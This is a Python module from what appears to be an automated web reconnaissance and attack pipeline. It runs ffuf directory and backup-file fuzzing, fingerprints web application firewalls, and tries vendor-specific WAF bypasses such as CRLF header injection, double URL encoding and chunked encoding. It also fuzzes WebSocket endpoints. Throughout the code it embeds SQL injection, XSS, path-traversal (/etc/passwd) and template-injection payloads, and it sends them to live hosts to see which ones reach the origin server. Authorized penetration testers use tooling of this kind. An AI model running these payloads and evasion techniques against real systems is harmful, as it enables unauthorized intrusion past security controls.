"""Fuzzing phases: endpoint fuzzing, WAF detection/bypass, WebSocket fuzzing."""
from reconchain.phases.helpers import *


async def phase_08_FUZZ(domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
    if skip & {"08-FUZZ"}:
        return {}
    _f_out = outdir / "fuzz.txt"
    if _f_out.exists() and not force:
        return {"08-FUZZ": str(_f_out), "count": count_nonblank(_f_out)}
    log("info", "Phase 08-FUZZ: fuzzing")
    _ffuf_dir = outdir / "ffuf"
    _ffuf_dir.mkdir(parents=True, exist_ok=True)
    # Clean stale ffuf files from root outdir (pre-migration leftovers)
    for stale in outdir.glob("ffuf_*.txt"):
        stale.unlink(missing_ok=True)
    for stale in outdir.glob("ffuf_*.json"):
        stale.unlink(missing_ok=True)
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "08-FUZZ: no URLs; skipping")
        return {"08-FUZZ": str(outdir / "fuzz.txt"), "count": 0}
    # Filter to only target domain URLs — never fuzz external third-party domains
    _target_domain = domain.lower()
    all_urls = [u for u in all_urls if _target_domain in urllib.parse.urlparse(u).netloc.lower()]
    if not all_urls:
        log("warn", "08-FUZZ: no target-domain URLs after filtering; skipping")
        return {"08-FUZZ": str(outdir / "fuzz.txt"), "count": 0}
    # Dedupe by (host, path) so URLs differing only in query params
    # don't all get fuzzed independently — saves significant time.
    deduped = _dedupe_by_host_path(all_urls)
    _proxy_opt = []
    if _PIPELINE_CFG.proxy:
        _proxy_opt = ["-x", _PIPELINE_CFG.proxy]
    # When operating over proxychains/tor or a SOCKS proxy, use smaller
    # wordlists, lower concurrency, and shorter timeouts — each request
    # is ~1-5s vs ~50ms on a direct link.
    _is_slow_network = _USE_PROXYCHAINS or bool(
        _PIPELINE_CFG.proxy and _PIPELINE_CFG.proxy.startswith(("socks4", "socks5"))
    )
    _FFUF_MAX_URLS = 5 if _is_slow_network else 20  # Cap concurrent ffuf jobs for slow networks
    sample = deduped[:min(_PIPELINE_CFG.sample_urls_fuzz, _FFUF_MAX_URLS)]
    _ffuf_timeout = 600 if _is_slow_network else 3000
    _ffuf_ext_timeout = 600 if _is_slow_network else 600
    _seclists_base = Path(os.environ.get("SECLISTS", "/usr/share/seclists"))
    wordlist = os.environ.get(
        "FFUF_WORDLIST",
        (
            str(_seclists_base / "Discovery/Web-Content/common.txt")
            if _is_slow_network
            else str(_seclists_base / "Discovery/Web-Content/raft-medium-directories.txt")
        ),
    )
    if not Path(wordlist).exists():
        wordlist = ""
    jobs: List[Tuple[str, List[str], int]] = []
    if not wordlist or not Path(wordlist).exists():
        alt = sorted(_seclists_base.glob("Discovery/Web-Content/common.txt"))
        if not alt:
            alt = sorted(_seclists_base.glob("Discovery/Web-Content/*.txt"))
        if alt:
            wordlist = str(alt[0])
    if not wordlist or not Path(wordlist).exists():
        log("warn", f"08-FUZZ: no wordlist found (searched {_seclists_base}), ffuf disabled")
        wordlist = ""
    if t.has("ffuf") and wordlist:
        for u in sample:
            parsed_u = urllib.parse.urlparse(u)
            base_url = urllib.parse.urlunparse((
                parsed_u.scheme, parsed_u.netloc,
                parsed_u.path.rstrip("/"), None, None, None,
            ))
            out_json = _ffuf_dir / f"ffuf_{safe_suffix(u)}.json"
            jobs.append(
                (
                    f"ffuf-{_safe_name(u)}",
                    [
                        "ffuf", "-s", "-ac",
                        "-u", base_url + "/FUZZ",
                        "-w", wordlist,
                        "-mc", "200,301,302,403",
                        "-o", str(out_json),
                    ] + _proxy_opt + _extra_http_args() + _rate_limit_args("ffuf"),
                    _ffuf_timeout,
                )
            )
        # Extension fuzzing pass — find .php, .json, .bak, .old, .swp files
        # using a lightweight wordlist (common.txt) with the -e flag.
        ext_wordlist = os.environ.get(
            "FFUF_EXT_WORDLIST",
            str(_seclists_base / "Discovery/Web-Content/common.txt"),
        )
        if Path(ext_wordlist).exists():
            for u in sample:
                parsed_u = urllib.parse.urlparse(u)
                base_url = urllib.parse.urlunparse((
                    parsed_u.scheme, parsed_u.netloc,
                    parsed_u.path.rstrip("/"), None, None, None,
                ))
                out_json = _ffuf_dir / f"ffuf_ext_{safe_suffix(u)}.json"
                jobs.append(
                    (
                        f"ffuf-ext-{_safe_name(u)}",
                        [
                            "ffuf", "-s", "-ac",
                            "-u", base_url + "/FUZZ",
                            "-w", ext_wordlist,
                            "-e", ".php,.json,.bak,.old,.swp,.txt,.xml,.tar.gz,.zip",
                            "-mc", "200,301,302,403",
                            "-o", str(out_json),
                        ] + _proxy_opt + _extra_http_args() + _rate_limit_args("ffuf"),
                        _ffuf_ext_timeout,
                    )
                )

    if jobs:
        for old in _ffuf_dir.glob("ffuf_*.txt"):
            old.unlink(missing_ok=True)
        log("info", f"08-FUZZ: starting {len(jobs)} ffuf jobs")
        await run_parallel(jobs, outdir, quiet=True)
        log("info", f"08-FUZZ: {len(jobs)} ffuf jobs finished")
        normalized: List[Path] = []
        for ffp in _ffuf_dir.glob("ffuf_*.json"):
            norm = ffp.with_suffix(".txt")
            ensure(norm).write_text("\n".join(_extract_urls_from_ffuf_json(ffp)) + "\n")
            normalized.append(norm)
        n = merge_unique(normalized, outdir / "fuzz.txt")
        for p in _ffuf_dir.glob("ffuf_*.json"):
            p.unlink(missing_ok=True)
        if n == 0:
            log("warn", "08-FUZZ: fuzzers produced no hits")
        return {"08-FUZZ": str(outdir / "fuzz.txt"), "count": n}
    log("info", "08-FUZZ: ffuf not available or no wordlist; keeping prior fuzz results")
    return {"08-FUZZ": str(outdir / "fuzz.txt"), "count": count_nonblank(_f_out)}


# --- WAF signatures and payloads ---
_WAF_SIGNATURES: List[Tuple[str, List[str], List[str]]] = [
    # Each entry: (name, header_substring_list, extra_indicator_list)
    # extra_indicators are checked against BOTH headers and body content, and may
    # be a full header name ("x-barracuda"), a "key: value" pair ("server: cloudflare"),
    # a wildcard ("*cloudflare*"), or a bare header prefix ending with ":" ("x-datapower:").
    ("Cloudflare", ["cf-ray", "__cfduid", "cloudflare"], ["server: cloudflare"]),
    ("Akamai", ["akamai"], ["server: akamai"]),
    ("AWS WAF", ["x-amz-id-2", "x-amz-cf-id", "x-amzn-requestid"], ["x-amzn-trace-id"]),
    ("Cloudfront", ["x-amz-cf-id", "x-amz-cf-pop"], []),
    ("F5 BIG-IP", ["x-application-context", "x-request-uid"], ["server: bigip"]),
    ("Imperva", ["x-iinfo", "incapsula"], ["x-cdn: incapsula"]),
    ("ModSecurity", ["x-powered-by: mod_security"], []),
    ("NetScaler", ["x-ns-server"], ["server: netscaler"]),
    ("Sucuri", ["x-sucuri-id", "x-sucuri-cache"], []),
    ("Barracuda", ["x-barracuda"], ["server: barracuda"]),
    ("Wordfence", ["x-wordfence"], []),
    ("StackPath", ["x-stackpath"], []),
    ("DenyAll", ["session-denial"], []),
    ("Radware", ["x-rtd"], ["x-sl-compstate"]),
    ("Comodo", ["x-cfwaf"], []),
    ("Airlock", ["x-arlock"], []),
    ("Fortinet", ["x-fortigate"], ["server: fortigate"]),
    ("Citrix", ["x-citrix"], []),
]
_WAF_PROBE_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT * FROM users--",
    "<script>alert(1)</script>",
    "../../../etc/passwd",
    "${7*7}",
    "{{7*7}}",
    "1; DROP TABLE users",
    "admin' --",
]


async def phase_21_WAF(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"21-WAF"}:
        return {}
    _p_out = outdir / "waf_detection.txt"
    if _p_out.exists() and not force:
        return {"21-WAF": str(_p_out), "count": count_nonblank(_p_out)}
    log("info", "Phase 21-WAF: WAF detection")
    findings: List[str] = []
    _p_urlopen = _get_urlopener()
    # Collect HTTP targets
    targets: List[str] = []
    hosts_file = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("04-SCAN.hosts") or outdir / "hosts.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
    if hosts_file.exists():
        for h in read_lines(hosts_file)[:_PIPELINE_CFG.sample_hosts_waf]:
            if not h.startswith("http"):
                h = f"https://{h}"
            targets.append(h.rstrip("/"))
    if not targets:
        log("warn", "Phase 21-WAF: no HTTP targets; skipping")
        return {"21-WAF": str(_p_out), "count": 0}
    # wafw00f integration
    if t.has("wafw00f") or t.has("wafw00f.py"):
        waf_bin = "wafw00f" if t.has("wafw00f") else "wafw00f.py"
        waf_out = outdir / "wafw00f_results.txt"
        await _run(
            "wafw00f",
            [waf_bin, *[tgt.replace("https://", "").replace("http://", "") for tgt in targets],
             "-o", str(waf_out), "-a"],
            600, outdir,
        )
        if waf_out.exists() and waf_out.stat().st_size > 0:
            for ln in read_lines(waf_out):
                findings.append(f"[wafw00f] {ln}")
        elif waf_out.exists():
            waf_out.unlink(missing_ok=True)
            log("warn", "wafw00f: output file is empty (target unreachable or crashed)")
    # Custom passive WAF detection (check response headers and body)
    async def _passive_waf_check(url: str) -> List[str]:
        results: List[str] = []
        try:
            req = urllib.request.Request(url, method="GET",
                headers={"User-Agent": "Mozilla/5.0"})
            _, resp_hdrs, resp_body = await _async_urlopen(_p_urlopen, req, timeout=10)
            headers_str = " ".join(f"{k}: {v}" for k, v in resp_hdrs.items()).lower()
            body = resp_body.decode("utf-8", errors="ignore").lower()
            for waf_name, header_indicators, extra_indicators in _WAF_SIGNATURES:
                detected = False
                for indicator in header_indicators:
                    if indicator.lower() in headers_str:
                        detected = True
                        break
                if not detected:
                    for indicator in extra_indicators:
                        if indicator.lower() in headers_str or indicator.lower() in body:
                            detected = True
                            break
                if detected:
                    results.append(f"[passive] {waf_name} detected on {url}")
                    break
        except Exception:
            pass
        return results

    # Active WAF detection (send malicious payloads, check block codes)
    async def _active_waf_check(url: str) -> List[str]:
        results: List[str] = []
        for payload in _WAF_PROBE_PAYLOADS:
            try:
                probe_url = f"{url}?q={urllib.parse.quote(payload)}"
                req = urllib.request.Request(probe_url, method="GET",
                    headers={"User-Agent": "Mozilla/5.0"})
                awaf_status, _, awaf_body = await _async_urlopen(_p_urlopen, req, timeout=10)
                body = awaf_body.decode("utf-8", errors="ignore").lower()
                if any(kw in body for kw in ("blocked", "denied", "rejected", "waf", "security")):
                    results.append(f"[active-blocked-content] {url} → waf keyword in response for payload: {payload[:40]}")
                    break
            except urllib.error.HTTPError as e:
                if e.code in (403, 406, 429, 503, 501):
                    results.append(f"[active-blocked] {url} → HTTP {e.code} with payload: {payload[:40]}")
                    break
            except Exception:
                continue
        return results

    passive_results = await asyncio.gather(*[_passive_waf_check(t) for t in targets])
    for pr in passive_results:
        findings.extend(pr)
    active_results = await asyncio.gather(*[_active_waf_check(t) for t in targets])
    for ar in active_results:
        findings.extend(ar)
    if not findings:
        findings.append("[passive] No WAF detected (passive signature analysis)")
    out = ensure(_p_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    # Set global WAF state so downstream phases can adjust behavior
    _PIPELINE_CFG.waf_detected = bool(findings and not any("No WAF detected" in f for f in findings))
    # Calculate evasion throttle: if WAF detected, add delay and randomize
    if _PIPELINE_CFG.waf_detected:
        _PIPELINE_CFG.waf_evasion_throttle = max(_PIPELINE_CFG.delay, 1.0)
        # Add jitter recommendation to findings
        findings.append("[waf-evasion] WAF detected — downstream phases should add delay=1.0+ and randomize User-Agent/headers")
    log("ok", f"Phase 21-WAF: {len(findings)} WAF detection findings → {out}")
    return {"21-WAF": str(out), "count": len(findings)}


# ────────────────── Phase 21b-WAFBYPASS: WAF Bypass Testing ──────────────────
_WAF_BYPASS_CORPUS: Dict[str, List[Dict[str, Any]]] = {
    "Cloudflare": [
        {"desc": "chunked encoding", "transform": "chunked", "payload": "' OR '1'='1"},
        {"desc": "double URL encode", "transform": "double_url", "payload": "<script>alert(1)</script>"},
        {"desc": "mixed case", "transform": "mixed_case", "payload": "<sCrIpT>alert(1)</sCrIpT>"},
        {"desc": "parameter pollution via ;", "transform": "semicolon_param", "payload": "' UNION SELECT * FROM users--"},
        {"desc": "\\r\\n header split", "transform": "crlf_header", "payload": "../../../etc/passwd"},
    ],
    "Akamai": [
        {"desc": "unicode normalize", "transform": "unicode", "payload": "<script>alert(1)</script>"},
        {"desc": "response split via \\r in JSON", "transform": "json_cr", "payload": '{"user":"admin\\r\\n"}', "content_type": "application/json"},
    ],
    "AWS WAF": [
        {"desc": "oversize body bypass", "transform": "oversize_body", "payload": "a" * 10000 + "' OR '1'='1"},
        {"desc": "gzip bomb", "transform": "gzip_bomb", "payload": "' UNION SELECT * FROM users--"},
    ],
    "ModSecurity": [
        {"desc": "protocol parser diff", "transform": "protocol_diff", "payload": "{{7*7}}"},
    ],
}

_WAF_BYPASS_GENERIC = [
    {"desc": "URL encoded", "transform": "url_encoded", "payload": "' OR '1'='1"},
    {"desc": "double URL encoded", "transform": "double_url", "payload": "<script>alert(1)</script>"},
    {"desc": "tab instead of space", "transform": "tab_space", "payload": "' || 1=1 --"},
    {"desc": "null byte prefix", "transform": "null_byte", "payload": "%00' OR '1'='1"},
]

async def phase_21b_WAFBYPASS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"21b-WAFBYPASS"}:
        return {}
    _out = outdir / "waf_bypass.txt"
    if _out.exists() and not force:
        return {"21b-WAFBYPASS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 21b-WAFBYPASS: WAF bypass technique testing")
    findings: List[str] = []
    _wb_urlopen = _get_urlopener()
    _wb_extra_headers = _extra_headers_dict()

    # Read WAF detection results
    waf_file = outdir / "waf_detection.txt"
    waf_vendors: Set[str] = set()
    if waf_file.exists():
        for ln in read_lines(waf_file):
            low = ln.lower()
            for vendor in _WAF_BYPASS_CORPUS:
                if vendor.lower() in low:
                    waf_vendors.add(vendor)

    with contextlib.suppress(Exception):
        for p in Path(outdir).glob("wafw00f_results.txt"):
            if p.exists():
                for ln in read_lines(p):
                    low = ln.lower()
                    for vendor in _WAF_BYPASS_CORPUS:
                        if vendor.lower() in low:
                            waf_vendors.add(vendor)

    # Collect targets
    targets: List[str] = []
    hosts_file = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("04-SCAN.hosts") or outdir / "hosts.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
    if hosts_file.exists():
        for h in read_lines(hosts_file)[:5]:
            if not h.startswith("http"):
                h = f"https://{h}"
            targets.append(h.rstrip("/"))
    if not targets:
        log("warn", "21b-WAFBYPASS: no targets; skipping")
        return {"21b-WAFBYPASS": str(_out), "count": 0}

    if not waf_vendors:
        log("warn", "21b-WAFBYPASS: no WAF detected; running generic bypass probes only")
    else:
        log("info", f"21b-WAFBYPASS: targeting {', '.join(sorted(waf_vendors))} WAF(s)")

    async def _has_waf_blocked(url: str, body: str, status: int) -> bool:
        block_kw = {"blocked", "denied", "rejected", "waf", "security", "forbidden",
                     "access denied", "request blocked", "challenge", "attention required"}
        body_lower = body.lower()
        if status in (403, 406, 429, 503, 501):
            return True
        if any(kw in body_lower for kw in block_kw):
            return True
        return False

    async def _try_bypass(target: str, entry: Dict[str, Any]) -> Optional[str]:
        transform = entry.get("transform", "")
        payload = entry.get("payload", "")
        desc = entry.get("desc", "")
        base_url = f"{target}/"
        probe_url = f"{base_url}?q={urllib.parse.quote(payload)}"
        headers = {"User-Agent": "Mozilla/5.0", **_wb_extra_headers}

        if transform == "double_url":
            probe_url = f"{base_url}?q={urllib.parse.quote(urllib.parse.quote(payload))}"
        elif transform == "mixed_case":
            probe_url = f"{base_url}?q={urllib.parse.quote(entry['payload'])}"
        elif transform == "semicolon_param":
            probe_url = f"{base_url};?q={urllib.parse.quote(payload)}"
        elif transform == "crlf_header":
            headers["X-Forwarded-For"] = "127.0.0.1\r\nX-Hack: 1"
        elif transform == "unicode":
            payload = payload.replace("<", "%uFF1C").replace(">", "%uFF1E")
            probe_url = f"{base_url}?q={payload}"
        elif transform == "json_cr":
            headers["Content-Type"] = entry.get("content_type", "application/json")
        elif transform == "oversize_body":
            probe_url = f"{base_url}?q={urllib.parse.quote(payload)}"
        elif transform == "gzip_bomb":
            return None
        elif transform == "protocol_diff":
            probe_url = f"{base_url}?q={urllib.parse.quote(payload)}"
            headers["Transfer-Encoding"] = "chunked"
        elif transform == "url_encoded":
            probe_url = f"{base_url}?q={urllib.parse.quote(payload)}"
        elif transform == "tab_space":
            probe_url = f"{base_url}?q={urllib.parse.quote(payload.replace(' ', '%09'))}"
        elif transform == "null_byte":
            probe_url = f"{base_url}?q={urllib.parse.quote(payload)}"

        try:
            req = urllib.request.Request(probe_url, method="GET", headers=headers)
            s, _, body_bytes = await _async_urlopen(_wb_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
            if not await _has_waf_blocked(probe_url, body, s):
                return f"[waf-bypass] {target} — {desc} — HTTP {s} — payload reached origin"
            return f"[waf-blocked] {target} — {desc} — HTTP {s} — blocked by WAF"
        except urllib.error.HTTPError as e:
            if e.code in (403, 406, 429, 503, 501):
                return f"[waf-blocked] {target} — {desc} — HTTP {e.code} — blocked by WAF"
            return None
        except Exception:
            return None

    bypass_corpus: List[Dict[str, Any]] = []
    for vendor in waf_vendors:
        bypass_corpus.extend(_WAF_BYPASS_CORPUS.get(vendor, []))
    if not bypass_corpus:
        bypass_corpus = list(_WAF_BYPASS_GENERIC)

    for target in targets:
        for entry in bypass_corpus:
            await _throttle_rate()
            result = await _try_bypass(target, entry)
            if result:
                findings.append(result)

    if not findings:
        findings.append("[waf-bypass] No WAF bypass techniques confirmed (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"21b-WAFBYPASS: {len(findings)} bypass checks → {out}")
    return {"21b-WAFBYPASS": str(out), "count": len(findings)}


# --- WebSocket fuzzing ---
_WS_FUZZ_PAYLOADS = [
    b'{"type":"ping"}',
    b'{"type":"subscribe","channel":"admin"}',
    b'{"type":"auth","token":"none"}',
    b'{"operationName":"IntrospectionQuery","query":"{__schema{types{name}}}","variables":{}}',
    b'{"query":"mutation{__debug{setCookie(name:\"x\",value:\"x\")}__sleep(ms:30000)}"}',
    b'<script>alert(1)</script>',
    b'{"id":"1","jsonrpc":"2.0","method":"listDatabases","params":{}}',
    b'\x00\x01\x02\x03',
    b'A' * 10000,
    b'{"type":"publish","channel":"*","data":"test"}',
]

async def phase_54_WS_FUZZ(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"54-WS-FUZZ"}:
        return {}
    _out = outdir / "websocket_fuzz.txt"
    if _out.exists() and not force:
        return {"54-WS-FUZZ": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 54-WS-FUZZ: WebSocket message fuzzing")
    if _PIPELINE_CFG.proxy or _USE_PROXYCHAINS:
        log("warn", "54-WS-FUZZ: raw sockets incompatible with proxy; skipping")
        return {"54-WS-FUZZ": str(_out), "count": 0}
    findings: List[str] = []
    _ws_extra_headers = _extra_headers_dict()
    ws_file = outdir / "websocket.txt"
    ws_findings = read_lines(ws_file) if ws_file.exists() else []
    ws_endpoints: List[str] = []
    for line in ws_findings:
        for proto in ("wss://", "ws://"):
            if proto in line:
                parts = line.split()
                for p in parts:
                    if p.startswith(proto):
                        ws_endpoints.append(p)
                        break
                break
    ws_endpoints = ws_endpoints[:5]
    if not ws_endpoints:
        ws_file2 = outdir / "endpoints_wss.txt"
        if ws_file2.exists():
            ws_endpoints = read_lines(ws_file2)[:5]
    if not ws_endpoints:
        findings.append("[ws-fuzz] No WebSocket endpoints to fuzz")
        out = ensure(_out)
        out.write_text("\n".join(findings) + "\n")
        return {"54-WS-FUZZ": str(out), "count": 0}

    import base64 as _ws_b64
    import socket as _ws_socket
    import ssl as _ws_ssl
    import struct as _ws_struct

    def _ws_connect(endpoint: str) -> Tuple[Optional[_ws_socket.socket], Optional[str]]:
        try:
            parsed = urllib.parse.urlparse(endpoint)
            scheme = parsed.scheme
            host = parsed.hostname or ""
            port = parsed.port or (443 if scheme == "wss" else 80)
            path = parsed.path or "/"
            sock = _ws_socket.socket(_ws_socket.AF_INET, _ws_socket.SOCK_STREAM)
            sock.settimeout(5)
            if scheme == "wss":
                ctx = _ws_ssl.create_default_context()
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.connect((host, port))
            ws_key = _ws_b64.b64encode(os.urandom(16)).decode()
            upgrade = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade\r\n"
                f"Sec-WebSocket-Key: {ws_key}\r\n"
                f"Sec-WebSocket-Version: 13\r\n"
                f"\r\n"
            )
            sock.sendall(upgrade.encode())
            resp = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if len(resp) > MAX_RECV or b"\r\n\r\n" in resp:
                        break
            except _ws_socket.timeout:
                pass
            if b"101" in resp and b"websocket" in resp.lower():
                return sock, endpoint
            sock.close()
        except Exception:
            try:
                sock.close()
            except Exception:
                pass
        return None, None

    def _ws_encode(data: bytes, opcode: int = 0x1) -> bytes:
        frame = bytearray()
        frame.append(0x80 | opcode)
        mask = os.urandom(4)
        length = len(data)
        if length < 126:
            frame.append(0x80 | length)
        elif length < 65536:
            frame.append(0x80 | 126)
            frame += _ws_struct.pack("!H", length)
        else:
            frame.append(0x80 | 127)
            frame += _ws_struct.pack("!Q", length)
        frame += mask
        frame += bytes(b ^ mask[i % 4] for i, b in enumerate(data))
        return bytes(frame)

    def _ws_send(sock: _ws_socket.socket, data: bytes, timeout: float = 4.0) -> Optional[bytes]:
        sock.settimeout(timeout)
        try:
            sock.sendall(_ws_encode(data))
            resp = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > MAX_RECV:
                    break
            return resp
        except _ws_socket.timeout:
            return None
        except Exception:
            return None

    for ep in ws_endpoints:
        sock, _ = _ws_connect(ep)
        if sock is None:
            continue
        for i, payload in enumerate(_WS_FUZZ_PAYLOADS):
            try:
                resp = _ws_send(sock, payload, timeout=3.0)
                if resp:
                    rtext = resp.decode("utf-8", errors="ignore").lower()
                    indicators = ["error", "exception", "traceback", "syntaxerror", "admin", "database",
                                  "password", "token", "secret", "debug", "stack"]
                    detected = [ind for ind in indicators if ind in rtext]
                    if detected:
                        findings.append(
                            f"[ws-fuzz-interesting] {ep} payload#{i} — interesting response: {detected}"
                        )
                    elif len(resp) > 1024:
                        findings.append(f"[ws-fuzz-large-response] {ep} payload#{i} — {len(resp)} bytes")
            except Exception:
                continue
        sock.close()

    if not findings:
        findings.append("[ws-fuzz] No interesting WebSocket fuzzing results")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"54-WS-FUZZ: {len(findings)} WS fuzz findings → {out}")
    return {"54-WS-FUZZ": str(out), "count": len(findings)}
